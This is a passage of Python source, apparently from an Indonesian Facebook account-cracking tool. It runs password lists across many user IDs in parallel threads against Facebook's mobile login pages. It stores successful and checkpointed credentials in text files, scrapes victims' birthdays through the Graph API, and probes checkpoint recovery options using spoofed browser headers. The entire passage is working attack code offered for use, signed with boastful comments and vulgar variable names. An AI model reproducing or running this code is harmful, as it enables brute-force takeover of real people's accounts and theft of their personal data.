				print((p+"\n [•] Crack Started..."+p+"\n [•] Account [OK] Saved to : ok.txt"+p+"\n [•] Account [CP] Saved to : cp.txt"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" [•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print("\r\x1b[0;33m * --> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
## Result Hasill ####
def cek_opsi():
	print((p+"\n [••] Masukan File cp.txt"))
	print((" [••] Contoh : cp.txt/ok.txt"))
	files = input(p+" [••] File: ")
	if files == "":
		cek_opsi()
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit(p+" [••] Files %s%s%s Tidak Ada!"%(h,files,p))
	print(p+" [••] Total Account Cp : "+str(len(buka_baju)))
	print(p+" [••] Check Opsi Checkpoint, Please Wait...")
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("•")
		print("[••] "+kontol.replace(" + ",""))
		try:
			check_in(titid[0].replace(" + ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	input("%s [BACK]"%(p))
	menu()

def check_in(user, pasw):
	mb = ("https://free.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12")
	ses = requests.Session()
	ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print(p+" ["+k+"•"+m+"•"+p+"] Total Opsi Yang Tersedia "+str(len(ngew)))
		for opt in range(len(ngew)):
			print("   "+str(opt+1)+" "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(p+" [••] %s"%(oh))
	else:
		print(p+" [••] Login Gagal, ID/Pass Salah\n")

if __name__=="__main__":
	os.system('git pull')
	menu()

# SUHU SUHU KOK REKAODE
# AWOK² :)
# BY : DIHI XCRACK
# SUSCRIBE CHENEL GUE SUHU
'))
